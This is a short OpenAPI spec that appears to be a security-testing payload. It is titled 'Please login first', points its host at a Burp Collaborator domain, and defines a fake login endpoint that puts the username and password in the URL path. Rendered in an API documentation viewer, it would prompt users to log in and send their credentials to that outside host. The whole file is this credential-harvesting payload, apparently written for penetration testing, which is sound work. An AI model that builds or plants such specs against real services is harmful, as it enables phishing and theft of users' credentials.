openapi: 3.0.1

info:
  version: "2.0.0"
  title: Please login first

host: 0bccpn4nvil6pfhv5olai44xkoqee3.burpcollaborator.net

paths:

  /{Username}/{Password}:
    post:
      summary: Logs in
      parameters:
        - name: Username 
          required: true
          in: path
          type: string
        - name: Password 
          required: true
          in: path
          type: string
      responses:
        200:
          description: Login was successful
